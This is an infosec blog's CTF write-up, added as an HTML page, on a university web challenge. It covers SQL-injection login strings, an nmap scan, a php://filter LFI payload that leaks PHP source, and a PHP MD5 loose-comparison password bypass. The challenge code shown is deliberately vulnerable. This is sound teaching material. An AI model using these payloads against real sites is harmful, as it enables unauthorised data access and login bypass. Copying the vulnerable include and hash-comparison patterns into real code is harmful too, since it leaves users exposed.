@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>KCSC: LFI/RFI Wrapper :: Yet, another infosec blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="This is the first iteration of my CTF write-up series for the new year. Today we will be solving one of my university&amp;rsquo;s initial challenges. The task is simple itself but I want to show you the mindset of how I play the game.
+Fingerprinting Manual testing The absolute first thing I do when encountering any web challenge, is to actually visit the webpage and click on everything, fill out every text boxes." />
+<meta name="keywords" content="infosec, pwn, ctf, challenges, hackthebox, reverse" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://legiahuyy.github.io/blog/en/posts/rfi-wrapper/" />
+
+
+
+
+<link rel="stylesheet" href="https://legiahuyy.github.io/blog/en/assets/style.css">
+
+  <link rel="stylesheet" href="https://legiahuyy.github.io/blog/en/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon" href="https://legiahuyy.github.io/blog/en/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="https://legiahuyy.github.io/blog/en/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="The Archivist" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="KCSC: LFI/RFI Wrapper">
+<meta property="og:description" content="This is the first iteration of my CTF write-up series for the new year. Today we will be solving one of my university&amp;rsquo;s initial challenges. The task is simple itself but I want to show you the mindset of how I play the game.
+Fingerprinting Manual testing The absolute first thing I do when encountering any web challenge, is to actually visit the webpage and click on everything, fill out every text boxes." />
+<meta property="og:url" content="https://legiahuyy.github.io/blog/en/posts/rfi-wrapper/" />
+<meta property="og:site_name" content="Yet, another infosec blog" />
+
+  
+    <meta property="og:image" content="https://legiahuyy.github.io/blog/en/img/favicon/green.png">
+  
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2021-02-24 09:30:00 &#43;1345 &#43;1345" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/blog/en/">
+  <div class="logo">
+    <style>
+      .blink {
+        animation: blinker 1s linear infinite;
+        color: red!important;
+}
+.logo_anchor
+{
+  color: blue!important;
+}
+
+@keyframes blinker {
+  50% {
+    opacity: 0;
+  }
+}
+    </style>
+    <div class="logo_anchor">
+      ./&ThinSpace; 
+    </div>
+      Archivist
+    <div class="blink"> # </div> 
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/blog/en/posts">1.Posts</a></li>
+        
+      
+        
+          <li><a href="/blog/en/categories">2.Categories</a></li>
+        
+      
+        
+          <li><a href="/blog/en/tags">3.Tags</a></li>
+        
+      
+        
+          <li><a href="/blog/en/about">4.About</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">More ▾</li>
+
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+                <li><a href="/blog/en/sitemap.xml">RSS</a></li>
+              
+            
+              
+                <li><a href="https://buymeacoffee.com/7Bkc3SH">Support</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/blog/en/posts">1.Posts</a></li>
+      
+    
+      
+        <li><a href="/blog/en/categories">2.Categories</a></li>
+      
+    
+      
+        <li><a href="/blog/en/tags">3.Tags</a></li>
+      
+    
+      
+        <li><a href="/blog/en/about">4.About</a></li>
+      
+    
+      
+        <li><a href="/blog/en/sitemap.xml">RSS</a></li>
+      
+    
+      
+        <li><a href="https://buymeacoffee.com/7Bkc3SH">Support</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://legiahuyy.github.io/blog/en/posts/rfi-wrapper/">KCSC: LFI/RFI Wrapper</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2021-02-24
+        
+      </span>
+    
+    
+      <span class="post-author">:: The Archivist</span>
+    
+    
+      <span class="post-reading-time">:: 5 min read (964 words)</span>
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://legiahuyy.github.io/blog/en/tags/kma/">kma</a>&nbsp;
+    
+    #<a href="https://legiahuyy.github.io/blog/en/tags/web-pentest/">web-pentest</a>&nbsp;
+    
+  </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p>This is the first iteration of my CTF write-up series for the new year. Today we will be solving one of my university&rsquo;s initial challenges. The task is simple itself but I want to show you the mindset of how I play the game.</p>
+<h2 id="fingerprinting">Fingerprinting<a href="#fingerprinting" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="manual-testing">Manual testing<a href="#manual-testing" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>The absolute first thing I do when encountering any web challenge, is to actually visit the webpage and click on everything, fill out every text boxes. Just for a few minutes, get a feeling of mechanics and how the website might operate. Looking at various functionality is the key to do web-pentest.</p>
+<p>The login page is shown as we follow our given URL, which is <code>http://p2n.000webhostapp.com/log_me_in/index.php?page=login</code></p>
+<p><img src="https://github.com/legiahuyy/image-host/blob/main/2021-2-24-RFI-Wrapper/1.png?raw=true" alt=""></p>
+<p>Pretty much simple. Let&rsquo;s try some universal input into those fields and see what the return is.</p>
+<pre tabindex="0"><code>username: admin
+password: admin
+</code></pre><p><img src="https://github.com/legiahuyy/image-host/blob/main/2021-2-24-RFI-Wrapper/3.png?raw=true" alt=""></p>
+<p>The result is expected, a single text line informing invalid credentials. Next we will put a quote (<code>'</code>) into one of the field to check whether or not adhere to malformed input.</p>
+<pre tabindex="0"><code>username: '
+password: admin
+</code></pre><p>But it still returns the same error line so we can assume that the form is somewhat safe from common bypassing technique.</p>
+<p>It also worth mentioning that you should try different types of input such as:</p>
+<pre tabindex="0"><code>admin' --
+admin' #
+admin'/*
+admin' or '1'='1
+...
+</code></pre><h3 id="automation-testing">Automation testing<a href="#automation-testing" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<h4 id="host-information">Host information<a href="#host-information" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>Next step is to enumerate the server type and ports. We all know in our current challenge that this step is insignificant but we can never know for sure, especially while dealing with real-life situations as this will help you determine which attack method to use, where and when to put the payload, etc.</p>
+<p>So let us fire up our favorite tool of all time in automated enumeration, nmap.</p>
+<pre tabindex="0"><code>nmap -v -A --os-guess p2n.000webhostapp.com
+</code></pre><p>Basically, above command will provide us with how many ports are currently open and what type of OS the server is using.</p>
+<pre tabindex="0"><code>...
+
+PORT      STATE    SERVICE
+22/tcp    filtered ssh
+80/tcp    open     http
+443/tcp   open     https
+873/tcp   filtered rsync
+2020/tcp  filtered xinupageserver
+2049/tcp  open     nfs
+8080/tcp  open     http-proxy
+9100/tcp  filtered jetdirect
+9101/tcp  filtered jetdirect
+32768/tcp open     filenet-tms
+
+...
+Device type: general purpose|storage-misc|WAP
+Running (JUST GUESSING): Linux 3.X|4.X|2.6.X|2.4.X (89%), HP embedded (87%), OpenBSD 4.X (86%), FreeBSD 12.X|11.X (86%)
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:2.6.22 cpe:/o:openbsd:openbsd:4.3 cpe:/o:freebsd:freebsd:12.0 cpe:/o:freebsd:freebsd:11.1 cpe:/o:linux:linux_kernel:2.4
+Aggressive OS guesses: Linux 3.10 - 4.11 (89%), Linux 4.10 (89%), Linux 4.4 (89%), Linux 3.13 or 4.2 (88%), HP P2000 G3 NAS device (87%), OpenWrt Kamikaze 7.09 (Linux 2.6.22) (86%), OpenBSD 4.3 (86%), FreeBSD 12.0-RELEASE (86%), Linux 3.18 (86%), Linux 3.16 (85%)
+No exact OS matches for host (test conditions non-ideal).
+</code></pre><p>Now we can see that the server is running on Linux-based OS. Using this we can keep going on enumerating those service ports but I will just put it here as we will discuss more about probing in our later posts.</p>
+<h2 id="in-depth-analysis">In-depth analysis<a href="#in-depth-analysis" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Now we want to pay a close attention to the given URL</p>
+<pre tabindex="0"><code>http://p2n.000webhostapp.com/log_me_in/index.php?page=login
+</code></pre><p>The variable <code>page</code> here looks pretty suspicious since its role is to act as a navigation controller. What to do here is to try assigning some value for <code>page</code>.</p>
+<pre tabindex="0"><code>http://p2n.000webhostapp.com/log_me_in/index.php?page=abc
+</code></pre><p><img src="https://github.com/legiahuyy/image-host/blob/main/2021-2-24-RFI-Wrapper/5.png?raw=true" alt=""></p>
+<p>Of course, it would be like this. The web server takes the <code>abc</code> value and then adds the <code>.php</code> extension after it.</p>
+<p>This is the result of <code>page=flag</code></p>
+<p><img src="https://github.com/legiahuyy/image-host/blob/main/2021-2-24-RFI-Wrapper/4.png?raw=true" alt=""></p>
+<p>After all, we are able to know that the endpoint has access to following objects:</p>
+<pre tabindex="0"><code>index.php
+login.php
+flag.php
+</code></pre><p>And we come to the conclusion about this endpoint is simply  a LFI/RFI gold-mine for us to abuse as the value of <code>page</code> is not being sanitized at all.</p>
+<p>In case you are not aware of LFI/RFI, you can <a href="https://en.wikipedia.org/wiki/File_inclusion_vulnerability">read about it here</a>.</p>
+<p>Since the webpage standard is not to include PHP objects as plain code, we have to wrap it up using any encoding types (base64). So our final payload would be as follow:</p>
+<pre tabindex="0"><code>http://p2n.000webhostapp.com/log_me_in/index.php?page=php://filter/convert.base64-encode/resource=index.php
+</code></pre><p>Using Burp Suite to prettify the output:</p>
+<p><img src="https://github.com/legiahuyy/image-host/blob/main/2021-2-24-RFI-Wrapper/6.png?raw=true" alt=""></p>
+<p>Decode the base64 buffer will let us have the PHP source of <code>index.php</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;page&#39;</span>])) {
+	$page <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;page&#39;</span>];
+	
+	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/flag/i&#34;</span>, $page))
+		<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;&lt;h1&gt;Not so ez =))). Let&#39;s think another way!!! &lt;/h1&gt;&#34;</span>);
+
+	<span style="color:#66d9ef">include</span>($_GET[<span style="color:#e6db74">&#39;page&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;.php&#39;</span>);
+}
+<span style="color:#66d9ef">else</span> {
+	<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Location: ?page=login&#39;</span>);
+}
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>Do the same with <code>login.php</code> and grab the source</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#34;flag.php&#34;</span>);
+
+<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;usr&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;pwd&#39;</span>]) ) {
+	$your_username <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;usr&#39;</span>];
+	$your_password <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;pwd&#39;</span>];
+
+	<span style="color:#66d9ef">if</span> ($your_username <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;admin&#34;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">md5</span>($your_password) <span style="color:#f92672">==</span> <span style="color:#a6e22e">md5</span>(<span style="color:#e6db74">&#34;NOOPCJF&#34;</span>) <span style="color:#f92672">&amp;&amp;</span> $your_password <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#34;NOOPCJF&#34;</span> )
+		<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Hello admin!! Here your flag: &#34;</span><span style="color:#f92672">.</span>$flag;
+	<span style="color:#66d9ef">else</span>
+		<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Something went wrong!!!&#34;</span>);
+}
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">&lt;!DOCTYPE html&gt;
+</span><span style="color:#960050;background-color:#1e0010">&lt;html lang=&#34;en&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">&lt;head&gt;
+</span><span style="color:#960050;background-color:#1e0010">	&lt;meta charset=&#34;UTF-8&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">	&lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">	&lt;title&gt;Login page&lt;/title&gt;
+</span><span style="color:#960050;background-color:#1e0010">&lt;/head&gt;
+</span><span style="color:#960050;background-color:#1e0010">&lt;body&gt;
+</span><span style="color:#960050;background-color:#1e0010">	&lt;h1&gt;Login form&lt;/h1&gt;
+</span><span style="color:#960050;background-color:#1e0010">	&lt;form action=&#34;?page=login&#34; method=&#34;POST&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">		&lt;label for=&#34;usr&#34;&gt; Username &lt;/label&gt;
+</span><span style="color:#960050;background-color:#1e0010">		&lt;input type=&#34;text&#34; name=&#34;usr&#34; required /&gt; &lt;br&gt;
+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">		&lt;label for=&#34;pwd&#34;&gt; Password &lt;/label&gt;
+</span><span style="color:#960050;background-color:#1e0010">		&lt;input type=&#34;text&#34; name=&#34;pwd&#34; required /&gt; &lt;br&gt;
+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">		&lt;input type=&#34;submit&#34; value=&#34;submit&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">	&lt;/form&gt;
+</span><span style="color:#960050;background-color:#1e0010">&lt;/body&gt;
+</span><span style="color:#960050;background-color:#1e0010">&lt;/html&gt;
+</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>Now we want to look at the IF statement as it provides us the valid credentials to achieve our flag</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">	<span style="color:#66d9ef">if</span> ($your_username <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;admin&#34;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">md5</span>($your_password) <span style="color:#f92672">==</span> <span style="color:#a6e22e">md5</span>(<span style="color:#e6db74">&#34;NOOPCJF&#34;</span>) <span style="color:#f92672">&amp;&amp;</span> $your_password <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#34;NOOPCJF&#34;</span> )
+		<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Hello admin!! Here your flag: &#34;</span><span style="color:#f92672">.</span>$flag;
+	<span style="color:#66d9ef">else</span>
+		<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Something went wrong!!!&#34;</span>);
+</code></pre></div><p>The username is clearly <code>admin</code> but the password part is a little tricky as it might seems the correct one is <code>NOOPCJF</code> but the following statement is telling otherwise.</p>
+<p>But there is a significant vulnerability here as the comparison between two hashes is using loose <code>==</code> operator.</p>
+<p>The MD5 hash of <code>NOOPCJF</code> is <code>0e818888003657176127862245791911</code>. This is not actually a valid MD5 since it starts with <code>\x0e</code> and with the loose comparison operator, it will result in 0. So all you have to do is to find a MD5 string that also starts with <code>\x0e</code>. In this case, we will use <code>240610708</code> (<code>0e462097431906509019562988736854</code>) as our password.</p>
+<pre tabindex="0"><code>Username: admin
+Password: 240610708
+</code></pre><p><img src="https://github.com/legiahuyy/image-host/blob/main/2021-2-24-RFI-Wrapper/7.png?raw=true" alt=""></p>
+<p>And the flag is <code>KCSC{gu7_ch0p_3m_hjhjhjhj!!!}</code></p>
+<h2 id="conclusion">Conclusion<a href="#conclusion" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>So that is it for today write-up, thank you and I hope you can learn something from this. Feel free to share it to your friends.</p>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="https://legiahuyy.github.io/blog/en/posts/ez-bof/">
+                <span class="button__icon">←</span>
+                <span class="button__text">KCSC: A simple BOF</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="https://legiahuyy.github.io/blog/en/posts/readme/">
+                <span class="button__text">A README.md</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>© 2022 The Archivist</a>.</span>
+    
+        <span>All posts are licensed under <a href="https://creativecommons.org/licenses/by/4.0/legalcode">CC BY 4.0</a>.</span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://legiahuyy.github.io/blog/en/assets/main.js"></script>
+<script src="https://legiahuyy.github.io/blog/en/assets/prism.js"></script>
+
+
+
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.6/medium-zoom.min.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+
+<script>
+const images = Array.from(document.querySelectorAll(".post-content img"));
+images.forEach(img => {
+  mediumZoom(img, {
+    margin: 0,  
+    background: '#222129',
+    scrollOffset: 40,  
+    container: null,  
+    template: null  
+  });
+});
+</script>
+
+
+  
+</div>
+
+</body>
+</html>
